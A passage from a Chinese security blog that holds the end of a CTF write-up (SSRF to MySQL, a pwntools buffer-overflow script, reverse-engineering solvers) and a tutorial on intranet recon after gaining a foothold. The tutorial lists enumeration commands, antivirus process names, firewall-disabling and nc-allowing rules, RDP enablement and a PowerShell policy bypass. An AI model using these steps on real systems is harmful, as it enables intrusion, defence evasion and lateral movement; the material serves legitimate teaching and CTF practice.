</span><br><span class="line">phi &#x3D; (p-1)*(q-1) </span><br><span class="line">d&#x3D;gmpy2.invert(e,phi)</span><br><span class="line">print long_to_bytes(pow(c,d,n))</span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="0X1-simplebrowser"><a href="#0X1-simplebrowser" class="headerlink" title="0X1 simplebrowser"></a>0X1 simplebrowser</h2><p>（忘了截图），打开点击browser，看到base64提示，提示flag在本地mysql，用户名为admin，知道是考察ssrf。</p><p>直接用gopherus，用户名输入admin，然后show databases;</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/84574444999567.png"></p><p>得到库<br>然后用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) <span class="keyword">from</span> information_schema.columns where table_schema =<span class="string">&#x27;ctfcontest&#x27;</span></span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name =<span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> table_scheam=<span class="string">&#x27;ctfcontest&#x27;</span></span><br></pre></td></tr></table></figure><p>爆字段</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/55112244987.png"></p><p>最后直接select * from ctfcontest.flag</p><p>得到flag{wqweb_simplebrowser}</p><p>全程使用</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/213451149.png"></p><h1 id="PWM"><a href="#PWM" class="headerlink" title="PWM"></a>PWM</h1><h2 id="0X1-cmcc-stack"><a href="#0X1-cmcc-stack" class="headerlink" title="0X1 cmcc_stack"></a>0X1 cmcc_stack</h2><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/564447778955.png"></p><p>直接拖进去f5查看代码，要求v5等于那个值</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/884998887.png"></p><p>0xdeadbeef</p><p>直接覆盖用上面的readbuff溢出覆盖栈来修改v5的值</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2222456128779.png"></p><p>计算函数到read的地址和函数到v5地址<br>到read是esp+80h+68,v5是7c，0x80+0x68-0x7c-8相减等于64<br>看下checksec没有保护直接走</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">pl &#x3D; b&#39;A&#39;*0x64 + p32(0xdeadbeef)</span><br><span class="line">p &#x3D; remote(&#39;172.多少来着忘了&#39;,888)</span><br><span class="line">p.sendline(pl)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Recverse"><a href="#Recverse" class="headerlink" title="Recverse"></a>Recverse</h1><h2 id="0X1-crackme"><a href="#0X1-crackme" class="headerlink" title="0X1 crackme"></a>0X1 crackme</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4144466287987.png"></p><p>输入用户名密码逐个字符异或然后作为参数传到关键函数</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/44144775692.png"></p><p>然后v3和v4异或，只有传入正确的值才能得到flag，看着就头疼。</p><p>根据题目，v4是int，范围只有0-255，非常的小，直接爆破走起</p><p>最后255个输出中中，找到flag</p><p>CMISCCTF{do_you_burp_and_solve}</p><h2 id="0X2-Check"><a href="#0X2-Check" class="headerlink" title="0X2 Check"></a>0X2 Check</h2><p>下载下来一个chanl.e文件，打开一看是llvm.ir，直接读吧<br>两个重点变量dso_local和MAX_SIZE<br>接下来的函数就是读取然后异或操作等等<br>根据代码，用python重新实现一遍</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">check &#x3D; &quot;\x1a\x1c\x16\x10\x00\x11\x12\xcb\xf2\x14\x0e\x05\x03\x1d\x19\x0e\x02\x0a\x1f\x07\x0c\x01\x17\x06\x0c\x1d\x14\x0b\x1f\x1d\x17\x07\x0d\x1d\x0e\x0c\x1e\x06\xfc\x87\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05&quot;</span><br><span class="line">lcheck &#x3D; [ord(i) for i in check]</span><br><span class="line">for i in range(len(lcheck)-1, 0, -1):</span><br><span class="line">lcheck[i-1] &#x3D; lcheck[i-1] ^ lcheck[i]</span><br><span class="line">flag &#x3D; &quot;&quot;.join([chr(i-5) for i in lcheck])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4415662568.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 黑盾杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透-信息收集</title>
      <link href="2020/09/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2020/09/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：内网渗透的本质，是信息收集！，信息收集这一环节其实贯穿了整个内网渗透！</p></blockquote><h1 id="01-立足点："><a href="#01-立足点：" class="headerlink" title="01-立足点："></a>01-立足点：</h1><p>Foothold，就是我们拿到内网中一台主机权限，作为内网渗透的突破口，我们所有的操作，包括流量转发，端口扫描，漏扫等操作，都会利用此主机为我们搭桥铺路，为以后的内网横向打下坚实的基础。</p><h1 id="02-立足点的信息收集"><a href="#02-立足点的信息收集" class="headerlink" title="02-立足点的信息收集"></a>02-立足点的信息收集</h1><h2 id="立足点信息收集包括："><a href="#立足点信息收集包括：" class="headerlink" title="立足点信息收集包括："></a>立足点信息收集包括：</h2><p>OS、权限、内网IP段、杀软、端口、服务、补丁更新频率、网络连接、共享、会话等</p><blockquote><p>注：如果是域内主机，OS、应用软件、补丁、服务、杀软这些一般都是批量安装的。</p></blockquote><p><strong>前方干货来袭,注意注意！</strong></p><h5 id="1-查询网络配置命令："><a href="#1-查询网络配置命令：" class="headerlink" title="1.查询网络配置命令："></a>1.查询网络配置命令：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">ipconfig &#x2F;all</span><br><span class="line"></span><br><span class="line">Linux:    </span><br><span class="line">ifconfig &#x2F;all</span><br><span class="line">cat &#x2F;etc&#x2F;resolv.conf</span><br><span class="line">cat &#x2F;etc&#x2F;sysconfig&#x2F;network</span><br><span class="line">cat &#x2F;etc&#x2F;networks</span><br></pre></td></tr></table></figure><h5 id="2-查询操作系统及软件的信息"><a href="#2-查询操作系统及软件的信息" class="headerlink" title="2.查询操作系统及软件的信息"></a>2.查询操作系统及软件的信息</h5><p>1）查看操作系统和版本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot;&#x2F;&#x2F;适用于英文的操作系统，中文的：systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称&quot; &#x2F;C:&quot;OS 版本&quot;&#39;</span><br><span class="line">    </span><br><span class="line">Linux:    </span><br><span class="line">查看服务器版本信息：</span><br><span class="line">Cat &#x2F;etc&#x2F;issue</span><br><span class="line">Cat &#x2F;etc&#x2F;*-release</span><br><span class="line">Cat &#x2F;etc&#x2F;lsb-release #基于debian</span><br><span class="line">Cat &#x2F;etc&#x2F;radhat-release #基于redhat</span><br><span class="line">查看内核版本信息：</span><br><span class="line">Cat &#x2F;proc&#x2F;vesion</span><br><span class="line">Uname -a</span><br><span class="line">Uname -mrs</span><br><span class="line">Rpm -q kernel</span><br><span class="line">Dmesg | grep linux</span><br><span class="line">Ls &#x2F;boot | grep vmlinuz-</span><br></pre></td></tr></table></figure><p>2）查看系统体系结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br><span class="line">    </span><br><span class="line">Linux:    </span><br><span class="line">uname -a</span><br><span class="line">dpkg --print-architecture   &#x2F;&#x2F;此命令只适用于基于Debian和Ubuntu的Linux发行版。        </span><br><span class="line">getconf LONG_BIT</span><br><span class="line">arch</span><br><span class="line">file &#x2F;sbin&#x2F;init</span><br><span class="line">        </span><br><span class="line">查看安装的软件及版本、路径等</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">windows:</span><br><span class="line">wmic product get name,version</span><br><span class="line">Powershell版本：</span><br><span class="line">powershell.exe &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,Version</span><br><span class="line">    </span><br><span class="line">Linux:    </span><br><span class="line">Ls -alh &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">Ls -alh &#x2F;sbin&#x2F;</span><br><span class="line">Dpkg -l</span><br><span class="line">Rpm -qa</span><br><span class="line">Ls -alh &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archivesO</span><br><span class="line">Ls -alh &#x2F;var&#x2F;cache&#x2F;yum&#x2F;</span><br></pre></td></tr></table></figure><h5 id="3-查询本机服务信息"><a href="#3-查询本机服务信息" class="headerlink" title="3.查询本机服务信息"></a>3.查询本机服务信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">wmic service list brief</span><br><span class="line"></span><br><span class="line">Linux:   </span><br><span class="line">service --status-all</span><br><span class="line">chkconfig --list</span><br><span class="line">ps aux</span><br><span class="line">进入init.d目录查看</span><br><span class="line">netstat -lntp</span><br><span class="line">ntsysv</span><br></pre></td></tr></table></figure><h5 id="4-查询进程列表"><a href="#4-查询进程列表" class="headerlink" title="4.查询进程列表"></a>4.查询进程列表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">windows:           </span><br><span class="line">tasklist&#x2F;&#x2F;或者wmic process list brief </span><br><span class="line">   </span><br><span class="line">Linux:    </span><br><span class="line">ps aux </span><br><span class="line"> </span><br><span class="line"> 常见杀毒软件进程：                  </span><br><span class="line"> 360sd.exe                    </span><br><span class="line"> 360tray.exe                   </span><br><span class="line"> ZhuDongFangYu.exe                   </span><br><span class="line"> KSafeTray.exe                   </span><br><span class="line"> SafeDogUpdateCenter.exe                   </span><br><span class="line"> McAfee McShield.exe                   </span><br><span class="line"> egui.exe &#x2F;&#x2F;NOD32                    </span><br><span class="line"> AVP.EXE  &#x2F;&#x2F;卡巴斯基                   </span><br><span class="line"> avguard.exe    &#x2F;&#x2F;小红伞                   </span><br><span class="line"> bdagent.exe    &#x2F;&#x2F;BitDefender</span><br></pre></td></tr></table></figure><h5 id="5-查看启动程序信息"><a href="#5-查看启动程序信息" class="headerlink" title="5.查看启动程序信息"></a>5.查看启动程序信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">wmic startup get command,caption</span><br><span class="line">     </span><br><span class="line">Linux:    </span><br><span class="line">PS</span><br><span class="line">ps aux | less  </span><br><span class="line">top</span><br><span class="line">pstree</span><br><span class="line">htop</span><br><span class="line">atop</span><br></pre></td></tr></table></figure><h5 id="6-查看计划任务"><a href="#6-查看计划任务" class="headerlink" title="6.查看计划任务"></a>6.查看计划任务</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</span><br><span class="line">   </span><br><span class="line">Linux:    </span><br><span class="line">crontab -l</span><br></pre></td></tr></table></figure><h5 id="7-查看主机开机时间"><a href="#7-查看主机开机时间" class="headerlink" title="7.查看主机开机时间"></a>7.查看主机开机时间</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">net statistics workstation</span><br><span class="line">   </span><br><span class="line">Linux:</span><br><span class="line">last  reboot &#x2F;&#x2F;查看历史启动时间</span><br><span class="line">W&#x2F;&#x2F;系统到目前运行了多久时间。反过来推算系统重启时间</span><br><span class="line">uptime</span><br><span class="line">TOP&#x2F;&#x2F;up后表示系统到目前运行了多久时间。反过来推算时间</span><br><span class="line">who -b 查看最后一次系统启动的时间。</span><br><span class="line">who -r 查看当前系统运行时间</span><br></pre></td></tr></table></figure><h5 id="8-查询用户列表"><a href="#8-查询用户列表" class="headerlink" title="8.查询用户列表"></a>8.查询用户列表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">net user</span><br><span class="line">net localgroup adinistrators&#x2F;&#x2F;获取本地管理员组成员</span><br><span class="line">query user || qwinsta&#x2F;&#x2F;查看当前再线用户</span><br><span class="line">   </span><br><span class="line">Linux:    </span><br><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line">cat &#x2F;etc&#x2F;group</span><br><span class="line">延申：cat &#x2F;etc&#x2F;passwd|grep -v nologin|grep -v halt|grep -v shutdown|awk -F&quot;:&quot;&#39;&#123; print $1&quot;|&quot;$3&quot;|&quot;$4 &#125;&#39;|more</span><br></pre></td></tr></table></figure><h5 id="9-列出或断开本地计算机与所连接的客户端之间的会话"><a href="#9-列出或断开本地计算机与所连接的客户端之间的会话" class="headerlink" title="9.列出或断开本地计算机与所连接的客户端之间的会话"></a>9.列出或断开本地计算机与所连接的客户端之间的会话</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">net session</span><br><span class="line">   </span><br><span class="line">Linux:    </span><br><span class="line">who -a</span><br></pre></td></tr></table></figure><h5 id="10-查询端口列表"><a href="#10-查询端口列表" class="headerlink" title="10.查询端口列表"></a>10.查询端口列表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><h5 id="11-查询补丁列表"><a href="#11-查询补丁列表" class="headerlink" title="11.查询补丁列表"></a>11.查询补丁列表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">systeminfo</span><br><span class="line">&#x2F;&#x2F;查找提权补丁信息</span><br><span class="line">systeminfo&gt;C:\Temp&gt;micropoor.txt&amp;(for %i in ( KB977165 KB2160329 KB2503665 KB2592799</span><br><span class="line">KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904</span><br><span class="line">KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find &#x2F;i</span><br><span class="line">&quot;%i&quot;|| @echo %i you can fuck)&amp;del &#x2F;f &#x2F;q &#x2F;a micropoor.txt        &#x2F;&#x2F;里面可以任意添加删除补丁编号</span><br><span class="line"></span><br><span class="line">Linux:  </span><br><span class="line">linux需要查看内核版本信息，查看安装的软件包，然后进行对比</span><br></pre></td></tr></table></figure><h5 id="12-查询本机共享列表"><a href="#12-查询本机共享列表" class="headerlink" title="12.查询本机共享列表"></a>12.查询本机共享列表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">net share&#x2F;&#x2F;wmic:</span><br><span class="line">wmic share get name,path,status</span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">在&#x2F;mnt&#x2F;hgfs目录下查看</span><br></pre></td></tr></table></figure><h5 id="13-查询路由表及所有可用接口的ARP缓存表"><a href="#13-查询路由表及所有可用接口的ARP缓存表" class="headerlink" title="13.查询路由表及所有可用接口的ARP缓存表"></a>13.查询路由表及所有可用接口的ARP缓存表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">route print</span><br><span class="line">arp -a</span><br><span class="line">  </span><br><span class="line">Linux:</span><br><span class="line">arp –a</span><br><span class="line">Route</span><br><span class="line">&#x2F;sbin&#x2F;route -nee</span><br></pre></td></tr></table></figure><h5 id="14-查询防火墙相关配置"><a href="#14-查询防火墙相关配置" class="headerlink" title="14.查询防火墙相关配置"></a>14.查询防火墙相关配置</h5><p>1）关闭防火墙</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">windows:  </span><br><span class="line">&#x2F;&#x2F;windows server 2003之前</span><br><span class="line">netsh firewall set opmode disable                                  </span><br><span class="line">&#x2F;&#x2F;Windows server 2003之后</span><br><span class="line">netsh advfirewall set allprofile state off</span><br><span class="line">  </span><br><span class="line">Linux:    </span><br><span class="line">&#x2F;&#x2F;暂时关闭防火墙</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">service iptables stop</span><br><span class="line">&#x2F;&#x2F;永久关闭防火墙</span><br><span class="line">systemctl disable firewalld</span><br><span class="line">chkconfig iptables  off</span><br></pre></td></tr></table></figure><p>2）查看防火墙配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">netsh firewall show config</span><br><span class="line"> </span><br><span class="line">Linux:   </span><br><span class="line">Iptables-save &gt;ipt.txt</span><br></pre></td></tr></table></figure><ol start="3"><li>修改防火墙配置</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">&#x2F;&#x2F;windows server 2003之前允许指定程序全部连接</span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br><span class="line">&#x2F;&#x2F;windows server 2003之后的版本</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;c:\nc.exe&quot;</span><br><span class="line">&#x2F;&#x2F;允许指定程序退出</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Allow nc&quot; dir&#x3D;out action&#x3D;allow program&#x3D;&quot;C:\nc.exe&quot;</span><br><span class="line">&#x2F;&#x2F;允许3389端口放行</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br><span class="line"> </span><br><span class="line">linux：   </span><br><span class="line">&#x2F;&#x2F;查看防火墙状态</span><br><span class="line">systemctl status firewalld</span><br><span class="line">&#x2F;&#x2F;启动防火墙</span><br><span class="line">systemctl start firewalld.service</span><br><span class="line">&#x2F;&#x2F;开放TCP的80端口，并重载防火墙</span><br><span class="line">firewall-cmd --zone&#x3D;public --add-port&#x3D;80&#x2F;tcp --permanent</span><br><span class="line">&#x2F;&#x2F;重载防火墙 </span><br><span class="line">firewall-cmd --reload</span><br><span class="line">&#x2F;&#x2F;查看防火墙开放端口</span><br><span class="line">firewall-cmd --zone&#x3D;public --list-ports</span><br></pre></td></tr></table></figure><p>4)自定义防火墙日志的存储位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br><span class="line">Linux:  </span><br><span class="line">参考文章https:&#x2F;&#x2F;blog.csdn.net&#x2F;xiexievv&#x2F;article&#x2F;details&#x2F;48001261</span><br></pre></td></tr></table></figure><h5 id="15-查看代理配置情况"><a href="#15-查看代理配置情况" class="headerlink" title="15.查看代理配置情况"></a>15.查看代理配置情况</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br><span class="line">   </span><br><span class="line">Linux:    </span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><h5 id="16-查询并开启远程连接服务"><a href="#16-查询并开启远程连接服务" class="headerlink" title="16.查询并开启远程连接服务"></a>16.查询并开启远程连接服务</h5><p>1）查看远程连接端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;V PortNumber</span><br></pre></td></tr></table></figure><p>2)在Windows server 2003中开启3389</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure><p>3)在Windows server 2008和2012中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1&#x2F;&#x2F;修改注册表方式reg query &quot;HKLM\System\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; &#x2F;v fSingleSessionPerUser &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure><h5 id="17-自动收集信息"><a href="#17-自动收集信息" class="headerlink" title="17.自动收集信息"></a>17.自动收集信息</h5><p>Empire下的主机信息收集，输出到格式为html文件<br>使用模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness&#x2F;host&#x2F;winenum</span><br><span class="line">execute</span><br></pre></td></tr></table></figure><h5 id="18-查询当前权限"><a href="#18-查询当前权限" class="headerlink" title="18.查询当前权限"></a>18.查询当前权限</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">whoami &#x2F;all</span><br><span class="line">&#x2F;&#x2F;查询指定用户的详细信息</span><br><span class="line">net user xxx &#x2F;domain</span><br><span class="line">  </span><br><span class="line">Linux:    </span><br><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><h1 id="03-域内的信息收集"><a href="#03-域内的信息收集" class="headerlink" title="03-域内的信息收集"></a>03-域内的信息收集</h1><h2 id="1-判断是否存在域"><a href="#1-判断是否存在域" class="headerlink" title="1.判断是否存在域"></a>1.判断是否存在域</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查看dns服务器</span><br><span class="line">ipconfig &#x2F;all</span><br><span class="line">nslookup dc.test.local&#x2F;&#x2F;将查看到的DNS服务器用nslookup进行解析</span><br><span class="line">        </span><br><span class="line">查看系统详细信息</span><br><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;登录服务器&quot;&#x2F;&#x2F;如果结果不为&quot;WORKGROUP&quot;则主机为域主机                      </span><br><span class="line">&#x2F;&#x2F;查询当前登录域及登录用户信息</span><br><span class="line">net group workstation                     </span><br><span class="line">&#x2F;&#x2F;判断主域</span><br><span class="line">net time &#x2F;domain&#x2F;&#x2F;命令用于查看域内时间，同时也可以查看域控制器</span><br></pre></td></tr></table></figure><h2 id="2-探测域内存活主机"><a href="#2-探测域内存活主机" class="headerlink" title="2. 探测域内存活主机"></a>2. 探测域内存活主机</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">使用nbtscan(http:&#x2F;&#x2F;www.unixwiz.net&#x2F;tools&#x2F;nbtscan.html)探测当前网段主机</span><br><span class="line">nbt.exe 192.168.2.0&#x2F;20</span><br><span class="line">        </span><br><span class="line">使用ICMP探测</span><br><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.2.%I | findstr &quot;TTL&#x3D;&quot;</span><br><span class="line">        </span><br><span class="line">通过ARPscan工具扫描探测内网</span><br><span class="line">arp.exe -t 192.168.2.0&#x2F;20</span><br><span class="line">        </span><br><span class="line">Empire中的ARPscan模块</span><br><span class="line">usemode situational_awareness&#x2F;network&#x2F;arpscan</span><br><span class="line">execute</span><br><span class="line">Nishang中的Invoke-ARPScan.ps1 </span><br><span class="line">powershell.exe -exec bypass -Command &quot;&amp; (Import-module 